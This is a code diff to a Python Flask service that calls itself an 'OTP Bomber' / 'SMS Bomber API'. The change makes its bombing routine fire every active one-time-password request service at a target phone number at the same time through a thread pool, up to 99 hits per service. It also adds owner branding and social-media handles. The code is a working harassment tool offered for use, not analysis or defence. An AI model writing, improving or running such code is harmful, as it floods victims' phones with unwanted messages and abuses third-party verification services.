@@ -167,9 +167,9 @@ def send_request(req, phone):
             save_json(STATS_FILE, stats_data)
         return False
 
-# ===== PARALLEL BOMBING =====
+# ===== TRULY PARALLEL BOMBING =====
 def parallel_bombing(phone, key, speed=5, otp_count=99):
-    """Parallel hits on all active requests with speed control"""
+    """PARALLEL: All active requests hit simultaneously"""
     active_requests = [r for r in requests_data if r.get('active', True)]
     
     if not active_requests:
@@ -184,66 +184,60 @@ def parallel_bombing(phone, key, speed=5, otp_count=99):
     success_hits = 0
     results = []
     
-    # Prepare phone variations for each request
-    phone_variants = {}
-    for req in active_requests:
-        variants = req.get('phones', [phone])
-        if not variants:
-            variants = [phone]
-        phone_variants[req['name']] = variants
-    
     # Calculate delay based on speed
     delay = 1.0 / speed  # seconds between hits per request
     
-    # For each active request
-    for req in active_requests:
-        req_results = []
-        req_success = 0
-        target_phone = random.choice(phone_variants[req['name']])
+    # For each active request (PARALLEL)
+    with ThreadPoolExecutor(max_workers=len(active_requests) * 10) as executor:
+        futures = []
+        req_map = {}
         
-        # Send OTP count requests in parallel
-        with ThreadPoolExecutor(max_workers=min(otp_count, 20)) as executor:
-            futures = []
+        for req in active_requests:
+            phone_variants = req.get('phones', [phone])
+            target_phone = random.choice(phone_variants) if phone_variants else phone
+            
+            # Submit all hits for this request in parallel
             for i in range(otp_count):
-                # Add small random delay to avoid exact same time
                 future = executor.submit(send_request, req, target_phone)
                 futures.append(future)
+                req_map[future] = {
+                    'request': req['name'],
+                    'hit': i + 1,
+                    'phone': target_phone
+                }
                 # Small delay between submissions to control speed
-                time.sleep(delay)
-            
-            # Collect results
-            for i, future in enumerate(futures):
-                success = future.result(timeout=15)
-                total_hits += 1
-                if success:
-                    success_hits += 1
-                    req_success += 1
-                
-                req_results.append({
-                    "hit": i + 1,
-                    "success": success,
-                    "phone": target_phone
-                })
-                
-                # Log
-                with stats_lock:
-                    log_entry = {
-                        "time": datetime.now().isoformat(),
-                        "request": req['name'],
-                        "phone": target_phone,
-                        "status": "success" if success else "failed",
-                        "hit": i + 1,
-                        "total_hits": otp_count
-                    }
-                    logs_data.append(log_entry)
-                    save_json(LOGS_FILE, logs_data[-500:])
+                time.sleep(delay / len(active_requests))  # Distribute delay across requests
         
-        results.append({
-            "request": req['name'],
-            "hits": req_results,
-            "total_success": req_success,
-            "total_hits": otp_count
-        })
+        # Collect results
+        for future in as_completed(futures):
+            success = future.result(timeout=15)
+            info = req_map[future]
+            total_hits += 1
+            if success:
+                success_hits += 1
+            
+            # Log
+            with stats_lock:
+                log_entry = {
+                    "time": datetime.now().isoformat(),
+                    "request": info['request'],
+                    "phone": info['phone'],
+                    "status": "success" if success else "failed",
+                    "hit": info['hit'],
+                    "total_hits": otp_count
+                }
+                logs_data.append(log_entry)
+                save_json(LOGS_FILE, logs_data[-500:])
+    
+    # Aggregate results per request
+    request_results = {}
+    for req in active_requests:
+        req_name = req['name']
+        req_hits = [log for log in logs_data if log['request'] == req_name and log['phone'] == phone]
+        request_results[req_name] = {
+            'total_success': sum(1 for h in req_hits if h['status'] == 'success'),
+            'total_hits': len(req_hits)
+        }
     
     return {
         "success": True,
@@ -256,7 +250,11 @@ def parallel_bombing(phone, key, speed=5, otp_count=99):
         "success_hits": success_hits,
         "failed_hits": total_hits - success_hits,
         "stats": stats_data,
-        "details": results
+        "details": request_results,
+        "message": f"🔥 OTP Bomber started on {phone} with {len(active_requests)} active services!",
+        "owner": "Gaurav Beniwal",
+        "telegram": "@gaurav_beniwal_0001",
+        "youtube": "https://www.youtube.com/@gaurav_beniwal_0001"
     }
 
 # ===== GLOBALS =====
@@ -267,7 +265,13 @@ stats_lock = threading.Lock()
 @app.route('/')
 @app.route('/api/health')
 def health():
-    return jsonify({"status": "ok", "message": "SMS Bomber API is live!"})
+    return jsonify({
+        "status": "ok",
+        "message": "💀 DEVILS WILL RISE — OTP Bomber API",
+        "owner": "Gaurav Beniwal",
+        "telegram": "@gaurav_beniwal_0001",
+        "youtube": "https://www.youtube.com/@gaurav_beniwal_0001"
+    })
 
 @app.route('/api/requests', methods=['GET'])
 def get_requests():
